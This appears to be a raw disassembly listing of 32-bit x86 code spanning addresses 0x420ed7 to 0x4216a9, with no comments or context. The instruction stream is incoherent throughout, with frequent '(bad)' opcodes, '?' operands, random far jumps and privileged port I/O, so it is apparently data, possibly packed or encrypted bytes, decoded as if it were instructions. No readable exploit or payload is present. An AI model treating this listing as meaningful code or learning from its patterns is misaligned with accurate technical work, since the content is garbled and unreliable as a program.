  420ed7:	nop
  420ed8:	push   0x8be9c419
  420edd:	and    BYTE PTR [edi+0x40],al
  420ee0:	pop    ss
  420ee1:	push   ds
  420ee2:	retf   0x4020
  420ee5:	es loop 0x420ebc
  420ee8:	scas   al,BYTE PTR es:[edi]
  420ee9:	gs cwde 
  420eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eec:	out    0x25,eax
  420eee:	and    bh,BYTE PTR [eax-0x11]
  420ef1:	imul   DWORD PTR [edx+0x1223168d]
  420ef7:	add    DWORD PTR [esi],0xffffff85
  420efa:	lds    ebp,FWORD PTR [eax]
  420efc:	cmp    BYTE PTR [ebx-0x44],al
  420eff:	mov    ds:0x1a72e2ef,al
  420f04:	dec    edi
  420f05:	adc    eax,0x29c71f15
  420f0a:	push   ebp
  420f0b:	mov    ecx,0x4131fb9d
  420f10:	mov    cl,0x12
  420f12:	adc    ebx,DWORD PTR [edi-0xd]
  420f15:	retf   
  420f16:	into   
  420f17:	mov    ds:0xc82b1a83,eax
  420f1c:	arpl   bx,si
  420f1e:	ret    
  420f1f:	(bad)  
  420f20:	test   al,0xb7
  420f22:	mov    bl,0x59
  420f24:	in     eax,dx
  420f25:	xchg   ecx,eax
  420f26:	fist   DWORD PTR [edx+0x2e]
  420f29:	mov    al,dl
  420f2b:	(bad)  
  420f2c:	fisub  DWORD PTR [edx-0x41]
  420f2f:	jge    0x420ef8
  420f31:	cmp    cl,BYTE PTR [eax]
  420f33:	pop    esi
  420f34:	int3   
  420f35:	push   edi
  420f36:	ss push cs
  420f38:	cld    
  420f39:	push   ebp
  420f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f3b:	mov    ah,0xf9
  420f3d:	and    esi,DWORD PTR [edi-0xc]
  420f40:	lea    ebx,[edx]
  420f42:	push   0x486d6585
  420f47:	and    al,BYTE PTR fs:[ebp+0x43d807f1]
  420f4e:	sub    al,BYTE PTR [edi]
  420f50:	mov    esp,0xcbb356d
  420f55:	or     DWORD PTR [edi+0xe],edx
  420f58:	repnz popa 
  420f5a:	sbb    DWORD PTR [edx-0x4f],0x2b
  420f5e:	in     al,0x0
  420f60:	xor    esp,0x43f33e2b
  420f66:	sub    BYTE PTR [ebx-0x6b],bl
  420f69:	and    eax,0x43933a6
  420f6e:	mov    ss,WORD PTR [eax]
  420f70:	ss out dx,eax
  420f72:	sub    DWORD PTR [ebp-0x4b391730],eax
  420f78:	xor    eax,0x2f4b4e72
  420f7d:	inc    edx
  420f7e:	adc    BYTE PTR [ebx],dh
  420f80:	cdq    
  420f81:	push   0xfbbf31c8
  420f86:	gs xchg edi,eax
  420f88:	cmp    eax,0xd7ccb88e
  420f8d:	out    dx,eax
  420f8e:	jg     0x420f7d
  420f90:	int3   
  420f91:	jne    0x420f85
  420f93:	adc    BYTE PTR [edi-0x1b88934a],bl
  420f99:	xchg   ebp,eax
  420f9a:	popf   
  420f9b:	clc    
  420f9c:	pop    ecx
  420f9d:	or     al,0xc1
  420f9f:	cmp    eax,0x4ca2178d
  420fa4:	jb     0x420f5d
  420fa6:	test   al,0x9a
  420fa8:	push   0xb3f03839
  420fad:	sub    al,0x3c
  420faf:	leave  
  420fb0:	inc    ebp
  420fb1:	sub    DWORD PTR [ebx+0x3c],ebx
  420fb4:	push   es
  420fb5:	cdq    
  420fb6:	inc    edx
  420fb7:	and    BYTE PTR [edx-0x73d03f43],al
  420fbd:	push   cs
  420fbe:	popa   
  420fbf:	scas   al,BYTE PTR es:[edi]
  420fc0:	retf   0xb92a
  420fc3:	and    DWORD PTR [esi+0x45],eax
  420fc6:	mov    eax,ds:0xc33b6774
  420fcb:	pop    ecx
  420fcc:	dec    ecx
  420fcd:	not    DWORD PTR [eax+0x55]
  420fd0:	js     0x42104d
  420fd2:	shr    BYTE PTR [esi-0x63],cl
  420fd5:	cmp    BYTE PTR [eax+0x2b98521f],dh
  420fdb:	sbb    esi,DWORD PTR ds:0x6f2e2759
  420fe1:	xor    DWORD PTR [eax+ebp*8+0x4a9a263b],esi
  420fe8:	mov    esi,?
  420fea:	jb     0x421032
  420fec:	push   esp
  420fed:	xchg   ebp,eax
  420fee:	or     BYTE PTR [ebx],bh
  420ff0:	cld    
  420ff1:	popa   
  420ff2:	mov    esi,0xb669fa8d
  420ff7:	test   eax,0xfd103a13
  420ffc:	imul   ecx,DWORD PTR [ebp-0x46],0x7
  421000:	(bad)  [ebx-0x1c14bc3b]
  421006:	out    0xe7,eax
  421008:	arpl   WORD PTR [eax+0x58],cx
  42100b:	stos   BYTE PTR es:[edi],al
  42100c:	dec    esi
  42100d:	cld    
  42100e:	or     DWORD PTR [edx+0xb],edi
  421011:	popa   
  421012:	aam    0xdc
  421014:	jecxz  0x420fae
  421016:	sahf   
  421017:	jge    0x420fe8
  421019:	mov    DWORD PTR [ebx+0x7e3799a7],esp
  42101f:	xchg   DWORD PTR [ebx+0x25ae3b95],esp
  421025:	jbe    0x421071
  421027:	daa    
  421028:	sar    DWORD PTR [ecx],1
  42102a:	sbb    dl,BYTE PTR [edi-0x5c]
  42102d:	mov    al,ds:0x3b86d83a
  421032:	(bad)  
  421033:	mov    ch,0xa6
  421035:	clc    
  421036:	mov    ss,WORD PTR [edx+0x28dd9318]
  42103c:	inc    ebp
  42103d:	adc    BYTE PTR [edx],dl
  42103f:	(bad)  
  421040:	mov    ebp,0x3411e948
  421045:	push   cs
  421046:	sub    eax,0x41d183d7
  42104b:	syscall 
  42104d:	jns    0x420ff3
  42104f:	jo     0x42103a
  421051:	mov    dh,0x4e
  421053:	(bad)  
  421054:	cs inc edx
  421056:	mov    ah,0xb1
  421058:	idiv   DWORD PTR [edx+0x755958f2]
  42105e:	add    al,0x91
  421060:	mov    bh,0x4c
  421062:	cmpxchg BYTE PTR [eax-0x38],ch
  421066:	lods   eax,DWORD PTR ds:[esi]
  421067:	push   cs
  421068:	jg     0x421026
  42106a:	aaa    
  42106b:	jns    0x4210d5
  42106d:	xor    BYTE PTR [eax+0x6784844],bl
  421073:	imul   esi,esi,0x7b504253
  421079:	outs   dx,DWORD PTR ds:[esi]
  42107a:	fcom   DWORD PTR [edi-0x757bf09c]
  421080:	outs   dx,DWORD PTR ds:[esi]
  421081:	mov    ebx,0xfd70eaad
  421086:	not    ah
  421088:	mov    BYTE PTR [ecx],bl
  42108a:	mov    eax,ds:0x501b49fd
  42108f:	push   0x75
  421091:	sbb    DWORD PTR [edx+0x6],eax
  421094:	sbb    cl,BYTE PTR [edi+0x56]
  421097:	mov    ebx,0x8dd3a6e1
  42109c:	mov    ch,0xbf
  42109e:	mov    ecx,0x5771c405
  4210a3:	dec    ebp
  4210a4:	aas    
  4210a5:	rcl    DWORD PTR [edi+0x2a],1
  4210a8:	inc    edx
  4210a9:	inc    esp
  4210aa:	and    eax,0x4491bc5f
  4210af:	and    cl,ch
  4210b1:	or     BYTE PTR [ebx+0x19],ch
  4210b4:	adc    edi,esi
  4210b6:	push   es
  4210b7:	xor    BYTE PTR [esi+0x7],bl
  4210ba:	push   es
  4210bb:	or     al,0xa5
  4210bd:	into   
  4210be:	mov    ds:0x99ae237d,al
  4210c3:	push   0xfffffff2
  4210c5:	adc    eax,0x387fa019
  4210ca:	or     ch,BYTE PTR [esi]
  4210cc:	retf   
  4210cd:	ret    
  4210ce:	sub    DWORD PTR [bx+0x7c],edx
  4210d2:	inc    ebp
  4210d3:	stos   DWORD PTR es:[edi],eax
  4210d4:	cld    
  4210d5:	and    DWORD PTR [ecx-0x70],eax
  4210d8:	scas   al,BYTE PTR es:[edi]
  4210d9:	pop    ecx
  4210da:	xchg   edi,eax
  4210db:	inc    esp
  4210dc:	outs   dx,BYTE PTR ds:[esi]
  4210dd:	jo     0x42115a
  4210df:	push   0xfbb92d7f
  4210e4:	pop    ecx
  4210e5:	jae    0x42113f
  4210e7:	call   DWORD PTR [esi]
  4210e9:	in     eax,dx
  4210ea:	cli    
  4210eb:	pop    es
  4210ec:	into   
  4210ed:	and    al,0x18
  4210ef:	and    DWORD PTR [edx-0x4b266be],ebp
  4210f5:	mov    al,ds:0x8b3542f5
  4210fa:	fcom   DWORD PTR [edx]
  4210fc:	mov    dh,0xf8
  4210fe:	mov    ebp,esi
  421100:	jnp    0x4210c8
  421102:	cmp    edi,DWORD PTR ds:0xd71b59a
  421108:	mov    ebp,0x23a9e2a9
  42110d:	retf   
  42110e:	dec    edx
  42110f:	lods   eax,DWORD PTR ds:[esi]
  421110:	sti    
  421111:	sub    DWORD PTR [eax-0x93f2d7d],ebx
  421117:	inc    eax
  421118:	ror    DWORD PTR [eax],cl
  42111a:	iret   
  42111b:	lea    ecx,[edi]
  42111d:	mov    edi,DWORD PTR [edx]
  42111f:	push   ds
  421120:	loop   0x42111d
  421122:	jo     0x4210f7
  421124:	pop    ebp
  421125:	mov    ecx,fs
  421127:	mov    dl,0xaf
  421129:	aaa    
  42112a:	into   
  42112b:	(bad)  
  42112c:	je     0x4211a0
  42112e:	repz je 0x421134
  421131:	jmp    0x42117a
  421133:	fisub  WORD PTR [bx+di]
  421136:	jge    0x4211a6
  421138:	fsubr  QWORD PTR [esi]
  42113a:	aam    0x97
  42113c:	push   cs
  42113d:	dec    ecx
  42113e:	or     ebp,DWORD PTR [edi]
  421140:	inc    edx
  421141:	inc    ebp
  421142:	jmp    0x421169
  421144:	call   0xbb19:0xfdaa945b
  42114b:	cli    
  42114c:	dec    ebx
  42114d:	test   DWORD PTR [edi+eax*2-0x63],eax
  421151:	xor    BYTE PTR [ecx],dl
  421153:	pop    es
  421154:	xchg   esi,eax
  421155:	cmp    eax,DWORD PTR [ecx+0x1aae5359]
  42115b:	mov    ebp,0xefaf3f01
  421160:	mov    ds:0x61e52cf8,eax
  421165:	aas    
  421166:	repz dec ecx
  421168:	imul   esp,DWORD PTR [edx-0x54],0xffffffd3
  42116c:	inc    eax
  42116d:	fwait
  42116e:	das    
  42116f:	mov    bh,0x6
  421171:	mov    edi,DWORD PTR [edi-0x14]
  421174:	stos   DWORD PTR es:[edi],eax
  421175:	push   cs
  421176:	xchg   ecx,eax
  421177:	mov    ds:0x7661ec56,eax
  42117c:	cmp    ebp,edi
  42117e:	shl    DWORD PTR [esi+0x6f],cl
  421181:	inc    ecx
  421182:	pop    ds
  421183:	jp     0x421195
  421185:	adc    DWORD PTR [edx-0x5ed6c4d8],esi
  42118b:	lods   al,BYTE PTR ds:[esi]
  42118c:	fsub   QWORD PTR [esi]
  42118e:	add    bl,BYTE PTR [esi+ebx*1]
  421191:	mov    cl,bl
  421193:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421195:	pushf  
  421196:	ret    
  421197:	in     al,dx
  421198:	call   0xfd065d36
  42119d:	mov    eax,ds:0x2028a5d9
  4211a2:	mov    DWORD PTR [edi+ecx*8-0x29992d32],ebx
  4211a9:	das    
  4211aa:	imul   edx,esi,0x278979d1
  4211b0:	test   eax,0x5d4d89c4
  4211b5:	cmp    ah,BYTE PTR [eax+0x1]
  4211b8:	xchg   ebp,eax
  4211b9:	inc    esi
  4211ba:	mov    bh,dh
  4211bc:	dec    ecx
  4211bd:	out    dx,eax
  4211be:	cmp    DWORD PTR [eax-0x44],ebx
  4211c1:	inc    edi
  4211c2:	or     eax,0xf5de1dfc
  4211c7:	xlat   BYTE PTR ds:[ebx]
  4211c8:	sar    BYTE PTR [eax+0x6d6eae03],1
  4211ce:	daa    
  4211cf:	mov    esi,0xd6de415d
  4211d4:	push   esp
  4211d5:	jno    0x4211f8
  4211d7:	jb     0x421200
  4211d9:	mov    al,ds:0xe6290f4b
  4211de:	mov    eax,0x74870a28
  4211e3:	inc    ebx
  4211e4:	cmc    
  4211e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211e6:	leave  
  4211e7:	fadd   st(6),st
  4211e9:	popaw  
  4211eb:	ds push edx
  4211ed:	sar    DWORD PTR [eax],0x9d
  4211f0:	jg     0x42119b
  4211f2:	xchg   esp,eax
  4211f3:	imul   ebp,DWORD PTR [esp+edx*1-0x3c],0x29
  4211f8:	jb     0x421220
  4211fa:	das    
  4211fb:	int3   
  4211fc:	fcomip st,st(3)
  4211fe:	inc    esi
  4211ff:	cld    
  421200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421201:	popa   
  421202:	call   0xc5074536
  421207:	inc    eax
  421208:	dec    edi
  421209:	fdiv   DWORD PTR [esi+ecx*1+0x30b19d37]
  421210:	sahf   
  421211:	retf   0x9d5c
  421214:	das    
  421215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421216:	ss mov ss,edi
  421219:	mov    ah,0x4
  42121b:	cs xor cl,al
  42121e:	scas   eax,DWORD PTR es:[edi]
  42121f:	mov    esi,0x9db07a53
  421224:	mov    dl,0x15
  421226:	arpl   WORD PTR [ecx],sp
  421228:	bnd jno 0x42127a
  42122b:	cmp    bl,BYTE PTR [eax+0x1e]
  42122e:	outs   dx,DWORD PTR ds:[esi]
  42122f:	gs data16 out dx,al
  421232:	mov    dl,0x91
  421234:	dec    edx
  421235:	xchg   ebp,eax
  421236:	cmp    al,0xfc
  421238:	pop    edi
  421239:	(bad)  
  42123a:	fs jmp 0x4212a3
  42123d:	cmp    DWORD PTR [esi-0x4c],ecx
  421240:	adc    al,0x5a
  421242:	addr16 pop esi
  421244:	(bad)  
  421245:	les    edi,FWORD PTR [eax+0x59]
  421248:	mov    dh,0x60
  42124a:	mov    bh,0x45
  42124c:	push   cs
  42124d:	fist   WORD PTR [edx-0x7bbcb275]
  421253:	ins    BYTE PTR es:[edi],dx
  421254:	or     ch,BYTE PTR [edx+0x5ad579d0]
  42125a:	add    bl,ah
  42125c:	repz mov bl,0x2c
  42125f:	dec    esi
  421260:	jbe    0x421255
  421262:	push   ds
  421263:	sub    esp,eax
  421265:	mov    ch,0x54
  421267:	loopne 0x42126f
  421269:	push   ecx
  42126a:	out    0xc6,eax
  42126c:	loopne 0x421245
  42126e:	scas   al,BYTE PTR es:[edi]
  42126f:	daa    
  421270:	jno    0x4212e5
  421272:	into   
  421273:	inc    edx
  421274:	inc    edx
  421275:	pop    esp
  421276:	repz add DWORD PTR [ebx+0x1b],edx
  42127a:	std    
  42127b:	sbb    bl,BYTE PTR [edx-0x5c]
  42127e:	ficomp DWORD PTR [ecx+edi*1]
  421281:	imul   ebx,DWORD PTR [edx-0x15a8578d],0x85e039b4
  42128b:	dec    ecx
  42128c:	call   0x2bf4:0xcdb4fb8f
  421293:	sbb    ebp,edx
  421295:	adc    eax,0xf7dda33d
  42129a:	shl    DWORD PTR [ebx-0x46263d35],cl
  4212a0:	cmp    bl,BYTE PTR [eax-0x1d6256b2]
  4212a6:	aam    0x4e
  4212a8:	jg     0x42126e
  4212aa:	rcr    DWORD PTR [ebp+0x26],0xd0
  4212ae:	xchg   ebp,eax
  4212af:	mov    bh,0xe3
  4212b1:	fisttp QWORD PTR [edx+0x12eb617f]
  4212b7:	mov    eax,ds:0xa72a6cd0
  4212bc:	push   edx
  4212bd:	fimul  DWORD PTR [eax+0x64]
  4212c0:	loopne 0x4212a3
  4212c2:	mov    WORD PTR [ebx+0xf82ffe8],ds
  4212c8:	in     al,0xe6
  4212ca:	sub    eax,0xe3b77c13
  4212cf:	outs   dx,BYTE PTR ds:[esi]
  4212d0:	mov    dh,0xda
  4212d2:	in     al,dx
  4212d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212d4:	out    0xca,al
  4212d6:	cdq    
  4212d7:	adc    BYTE PTR [edi-0x6d0099d9],bh
  4212dd:	mov    bl,0x93
  4212df:	jae    0x4212b8
  4212e1:	inc    eax
  4212e2:	jne    0x421347
  4212e4:	mov    ?,WORD PTR [ebx+0x486ab191]
  4212ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212eb:	mov    ebp,?
  4212ed:	lods   eax,DWORD PTR ds:[esi]
  4212ee:	sbb    DWORD PTR [edi+0x1abb255f],ebp
  4212f4:	iret   
  4212f5:	push   eax
  4212f6:	add    eax,DWORD PTR [eax+ecx*2]
  4212f9:	lods   eax,DWORD PTR ds:[esi]
  4212fa:	pushf  
  4212fb:	mov    al,0xaa
  4212fd:	mov    dh,ah
  4212ff:	sbb    esi,DWORD PTR [edx]
  421301:	sub    ah,al
  421303:	inc    esi
  421304:	xor    BYTE PTR [ebp-0x28c95b00],ch
  42130a:	xchg   edx,eax
  42130b:	dec    esp
  42130c:	jne    0x4212c4
  42130e:	mov    dl,0xb1
  421310:	hlt    
  421311:	xor    ebp,esi
  421313:	aam    0x70
  421315:	mov    ch,0xe0
  421317:	dec    edi
  421318:	ret    
  421319:	and    DWORD PTR [ebp+0x8],esi
  42131c:	dec    esp
  42131d:	pop    esi
  42131e:	aam    0xc3
  421320:	loop   0x421325
  421322:	sbb    al,0xd8
  421324:	clc    
  421325:	mov    eax,0xe7266d94
  42132a:	(bad)  
  42132b:	fadd   QWORD PTR [edx+0x34ffeb2e]
  421331:	add    ch,BYTE PTR [edi+ebx*4-0x2f3c90d8]
  421338:	fist   DWORD PTR [ecx-0x5ac3353e]
  42133e:	xchg   BYTE PTR [esi],bh
  421340:	xor    DWORD PTR [edx+0x2e8df98c],0xf77c6ae7
  42134a:	xor    esp,DWORD PTR [ebp-0x52c74688]
  421350:	into   
  421351:	xchg   ebp,eax
  421352:	adc    eax,0x3d2180da
  421357:	mov    al,ds:0xd68c34e6
  42135c:	push   es
  42135d:	data16 xchg BYTE PTR [ebx],dl
  421360:	ins    BYTE PTR es:[edi],dx
  421361:	jle    0x42137c
  421363:	in     al,dx
  421364:	inc    ecx
  421365:	gs popa 
  421367:	dec    BYTE PTR [ecx]
  421369:	xchg   ebx,eax
  42136a:	dec    esp
  42136b:	pop    ebx
  42136c:	jo     0x4213c4
  42136e:	mov    al,ds:0x1c7761a0
  421373:	xchg   ebp,eax
  421374:	adc    BYTE PTR [eax+0x567e400],ch
  42137a:	sub    al,0x68
  42137c:	mov    bl,0xf
  42137e:	aad    0x24
  421380:	mov    WORD PTR [eax-0x2d],ds
  421383:	jle    0x421316
  421385:	inc    esp
  421386:	xchg   edx,eax
  421387:	aaa    
  421388:	and    DWORD PTR [eax+0x4cd1ee3],ebx
  42138e:	push   ss
  42138f:	mov    edx,0x29203a5f
  421394:	(bad)  
  421395:	fwait
  421396:	mov    esp,DWORD PTR [esi+0xb]
  421399:	xchg   edx,eax
  42139a:	jbe    0x421412
  42139c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42139d:	push   ebp
  42139e:	outs   dx,BYTE PTR ds:[esi]
  42139f:	adc    esp,ebx
  4213a1:	jle    0x4213dd
  4213a3:	popf   
  4213a4:	dec    ebx
  4213a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213a6:	sar    DWORD PTR [edi],0xc
  4213a9:	cs es popa 
  4213ac:	adc    eax,0xcf5ee762
  4213b1:	hlt    
  4213b2:	xlat   BYTE PTR ds:[ebx]
  4213b3:	xchg   DWORD PTR cs:[ecx],edx
  4213b6:	sub    BYTE PTR [eax-0x2ed2351f],dl
  4213bc:	aaa    
  4213bd:	dec    edi
  4213be:	leave  
  4213bf:	inc    ecx
  4213c0:	adc    BYTE PTR [ebp+0x4f],dl
  4213c3:	or     eax,0xf4a4f5eb
  4213c8:	addr16 (bad) 
  4213cb:	mov    edi,0xdeecaf72
  4213d0:	add    esi,DWORD PTR [esi]
  4213d2:	sbb    BYTE PTR ds:0xea66888a,0xb7
  4213d9:	pop    es
  4213da:	int    0x0
  4213dc:	cs std 
  4213de:	xchg   BYTE PTR [ebp+0x5f],al
  4213e1:	jle    0x4213cd
  4213e3:	and    ch,0x45
  4213e6:	cmc    
  4213e7:	jnp    0x4213d7
  4213e9:	xchg   esp,ebx
  4213eb:	repnz fnstsw WORD PTR [edi-0x5]
  4213ef:	les    ebx,FWORD PTR [esp+eax*2+0x3a]
  4213f3:	push   0xffffffad
  4213f5:	imul   ebp,esi,0x63ef03f5
  4213fb:	dec    edx
  4213fc:	or     BYTE PTR [ebx-0x31],ah
  4213ff:	add    al,BYTE PTR [esi+ecx*2+0x76]
  421403:	jle    0x42145e
  421405:	and    al,0x53
  421407:	or     BYTE PTR [esi+edx*4+0x4ba6a2c8],0xb0
  42140f:	pop    esi
  421410:	test   DWORD PTR [ecx],esi
  421412:	push   ebp
  421413:	jnp    0x421432
  421415:	mov    esp,0x96585e0f
  42141a:	pop    ebp
  42141b:	loopne 0x421414
  42141d:	cli    
  42141e:	test   BYTE PTR ds:0x23cfd3e9,bh
  421424:	bound  edx,QWORD PTR [eax]
  421426:	js     0x4213b6
  421428:	stos   BYTE PTR es:[edi],al
  421429:	pop    edi
  42142a:	shr    edx,0x8d
  42142d:	push   es
  42142e:	mov    eax,0xea308d8a
  421433:	mov    edi,0xf18db628
  421438:	xor    BYTE PTR [ebp+0x0],dh
  42143b:	or     dl,BYTE PTR [esi+edx*2-0x28]
  42143f:	jne    0x421439
  421441:	clc    
  421442:	mul    BYTE PTR [edi]
  421444:	dec    eax
  421445:	pop    ss
  421446:	fldl2t 
  421448:	in     eax,dx
  421449:	push   es
  42144a:	and    DWORD PTR [ebp+0x34],0xae7f0f41
  421451:	dec    DWORD PTR [edi-0x2b8bae1a]
  421457:	adc    dl,BYTE PTR [eax-0x30]
  42145a:	adc    edx,esi
  42145c:	mov    ch,0x54
  42145e:	popa   
  42145f:	fisubr WORD PTR [ebp+0x4dc5e6b]
  421465:	mov    edx,0x13d70e2c
  42146a:	sbb    dh,al
  42146c:	lods   al,BYTE PTR ds:[esi]
  42146d:	ds cmp eax,0x75853df0
  421473:	xor    cl,cl
  421475:	mov    esi,0x1042d1ce
  42147a:	daa    
  42147b:	aas    
  42147c:	xchg   ebx,eax
  42147d:	hlt    
  42147e:	inc    ebp
  42147f:	ins    BYTE PTR es:[edi],dx
  421480:	xchg   ebp,eax
  421481:	daa    
  421482:	jmp    0x7ada:0xe382e656
  421489:	mov    eax,ds:0x1d4bcc31
  42148e:	pop    ds
  42148f:	xchg   esi,eax
  421490:	jnp    0x421471
  421492:	xchg   edx,eax
  421493:	and    eax,0x4563778b
  421498:	xor    DWORD PTR [ebp+0x5778bd57],0xfffffff2
  42149f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214a0:	arpl   WORD PTR [ecx],bp
  4214a2:	pop    ebx
  4214a3:	sbb    eax,0x71cee2e1
  4214a8:	mov    ecx,0xf6133777
  4214ad:	mov    ah,0xc3
  4214af:	inc    ebp
  4214b0:	xor    cl,BYTE PTR [ebx-0x1169f7b6]
  4214b6:	jmp    0x6599b00
  4214bb:	and    al,0x99
  4214bd:	cli    
  4214be:	imul   edx,DWORD PTR [ebp+0x39568efa],0x64197311
  4214c8:	std    
  4214c9:	or     BYTE PTR [eax+0x1b6b6714],ch
  4214cf:	jmp    0xa6d5eafe
  4214d4:	fadd   DWORD PTR [ebx-0x34f3078e]
  4214da:	pop    es
  4214db:	into   
  4214dc:	pop    eax
  4214dd:	xchg   ebx,eax
  4214de:	and    BYTE PTR [ecx+ebx*4],bh
  4214e1:	jne    0x421531
  4214e3:	(bad)  
  4214e5:	push   cs
  4214e6:	push   ecx
  4214e7:	shl    DWORD PTR [ecx-0x3bf19e52],0x65
  4214ee:	mov    DWORD PTR [esi-0x4e],esp
  4214f1:	push   ebp
  4214f2:	mov    ecx,0xf23b8c07
  4214f7:	xchg   BYTE PTR [ecx],bh
  4214f9:	stos   BYTE PTR es:[edi],al
  4214fa:	icebp  
  4214fb:	mov    bh,0x7a
  4214fd:	jmp    0x4214f1
  4214ff:	add    DWORD PTR [edx-0x7ff9bdb3],esp
  421505:	data16 jne 0x4214ca
  421508:	jl     0x42154b
  42150a:	jg     0x4214dd
  42150c:	nop
  42150d:	jmp    0x421546
  42150f:	or     dh,BYTE PTR [ecx]
  421511:	rcr    BYTE PTR [ecx],1
  421513:	add    DWORD PTR [esi+eiz*8+0x3f],ebp
  421517:	int    0xf9
  421519:	loopne 0x421547
  42151b:	dec    ebp
  42151c:	push   es
  42151d:	add    eax,DWORD PTR [ebx+0x49]
  421520:	adc    DWORD PTR [eax],edi
  421522:	pusha  
  421523:	aaa    
  421524:	aam    0xa
  421526:	test   DWORD PTR [ebp-0xf],0xb19644ac
  42152d:	add    esp,eax
  42152f:	push   ds
  421530:	jmp    0x42152d
  421532:	mov    cl,0x36
  421534:	ja     0x42152d
  421536:	rcl    BYTE PTR [edx+0x7e39f8b1],0x37
  42153d:	retf   0x87df
  421540:	jp     0x4214c7
  421542:	or     DWORD PTR [ecx+0x6b],0xc6fb7f6d
  421549:	mov    dl,0xf
  42154b:	dec    ebp
  42154c:	iret   
  42154d:	aad    0xdc
  42154f:	jl     0x4214d4
  421551:	in     eax,dx
  421552:	adc    DWORD PTR [ecx-0x2a759c42],esp
  421558:	mov    esp,0x1ada1087
  42155d:	jno    0x42156b
  42155f:	mov    edx,0xabf584e1
  421564:	and    dh,BYTE PTR [ecx]
  421566:	stos   DWORD PTR es:[edi],eax
  421567:	div    BYTE PTR [ecx+ebp*1-0x15a73b0f]
  42156e:	push   esp
  42156f:	push   ecx
  421570:	jp     0x4215cd
  421572:	(bad)  [ebp+0x20]
  421575:	jmp    0xc8a17ba8
  42157a:	loope  0x4215e6
  42157c:	add    al,0x6e
  42157e:	jl     0x421564
  421580:	rol    DWORD PTR [bp+di],cl
  421583:	imul   ebp,DWORD PTR [ebx+eax*4-0x48141377],0x7c301e4d
  42158e:	cwde   
  42158f:	scas   al,BYTE PTR es:[edi]
  421590:	imul   ebp,DWORD PTR [edx],0x43fa6988
  421596:	push   0xb09f269b
  42159b:	adc    bh,BYTE PTR [ebp+esi*1+0x42]
  42159f:	mov    edx,0xc551d929
  4215a4:	(bad)  
  4215a5:	add    eax,0x9ab3df55
  4215aa:	jmp    0x4215d2
  4215ac:	(bad)  
  4215ad:	cmp    ebp,0xffffff9a
  4215b0:	loopne 0x421604
  4215b2:	dec    ebp
  4215b3:	jge    0x4215f2
  4215b5:	mov    ecx,esp
  4215b7:	lods   eax,DWORD PTR ds:[esi]
  4215b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215b9:	loopne 0x4215df
  4215bb:	fsubr  QWORD PTR [edx]
  4215bd:	adc    dh,BYTE PTR [ecx+0x7c3572f5]
  4215c3:	js     0x421622
  4215c5:	aas    
  4215c6:	mov    ebp,0x6d31bc85
  4215cb:	hlt    
  4215cc:	push   ebp
  4215cd:	ins    BYTE PTR es:[edi],dx
  4215ce:	jae    0x421622
  4215d0:	jl     0x42157e
  4215d2:	push   ebx
  4215d3:	mov    ds:0x1d99a636,al
  4215d8:	out    dx,al
  4215d9:	mov    edi,0x3df5377e
  4215de:	arpl   WORD PTR cs:[ebp+0x30a5db77],dx
  4215e5:	jmp    0xa9de:0x4ebf2cee
  4215ec:	in     al,dx
  4215ed:	out    0x9f,al
  4215ef:	mov    DWORD PTR [ebx],edx
  4215f1:	std    
  4215f2:	push   ds
  4215f3:	test   DWORD PTR [eax],0x83484a1c
  4215f9:	push   edi
  4215fa:	(bad)  
  4215fb:	jp     0x421596
  4215fd:	xor    eax,DWORD PTR [bp+si-0xe39]
  421602:	add    ch,BYTE PTR [eax-0x3a]
  421605:	ds push esp
  421607:	cmc    
  421608:	fidivr DWORD PTR [ebx]
  42160a:	inc    edi
  42160b:	xchg   BYTE PTR [esi+0x21ecef5b],dh
  421611:	ja     0x42166a
  421613:	adc    cl,bh
  421615:	iret   
  421616:	loop   0x421607
  421618:	int3   
  421619:	addr16 leave 
  42161b:	pop    ss
  42161c:	test   BYTE PTR [edi-0x7e902005],bl
  421622:	or     BYTE PTR [ebp+0x48],al
  421625:	mov    ds:0xb9e33fa8,al
  42162a:	les    edi,FWORD PTR [edi-0x5a]
  42162d:	imul   ebx
  42162f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421630:	popa   
  421631:	cmp    esp,esi
  421633:	xchg   esp,eax
  421634:	pop    esp
  421635:	push   edi
  421636:	(bad)  
  421637:	xchg   edi,eax
  421638:	inc    esi
  421639:	pop    edi
  42163a:	adc    al,0x31
  42163c:	mov    ebx,0xde0d701b
  421641:	or     ecx,DWORD PTR [ebx+0x296bf544]
  421647:	and    DWORD PTR [edi-0x6a],eax
  42164a:	test   eax,0xfcf1b91f
  42164f:	pop    ss
  421650:	test   BYTE PTR [eax-0x14083748],bh
  421656:	mov    BYTE PTR [esi*1-0x337bf918],dl
  42165d:	mov    ah,0x2e
  42165f:	dec    eax
  421660:	loop   0x4215eb
  421662:	hlt    
  421663:	sbb    ecx,DWORD PTR [esi]
  421665:	mov    esp,0xa8391b99
  42166a:	out    dx,eax
  42166b:	xchg   esp,eax
  42166c:	cli    
  42166d:	ds hlt 
  42166f:	jae    0x421625
  421671:	(bad)  
  421672:	in     eax,0x59
  421674:	mov    edi,DWORD PTR [esi+0x504cfe61]
  42167a:	push   es
  42167b:	jns    0x4216a4
  42167d:	xchg   esi,eax
  42167e:	jg     0x421662
  421680:	jne    0x4216aa
  421682:	outs   dx,BYTE PTR cs:[esi]
  421684:	jle    0x4216c7
  421686:	dec    ecx
  421687:	xor    DWORD PTR [esp+ecx*1+0x58c48e41],esp
  42168e:	pushf  
  42168f:	xor    eax,0x37a4699d
  421694:	sub    DWORD PTR [edx],edi
  421696:	ss ins DWORD PTR es:[edi],dx
  421698:	jbe    0x4216fd
  42169a:	aam    0x24
  42169c:	pop    ecx
  42169d:	nop
  42169e:	adc    BYTE PTR [eax],al
  4216a0:	push   ds
  4216a1:	mov    ecx,DWORD PTR [esi+0x3e8b8bf7]
  4216a7:	fwait
  4216a8:	icebp  
  4216a9:	push   ebx
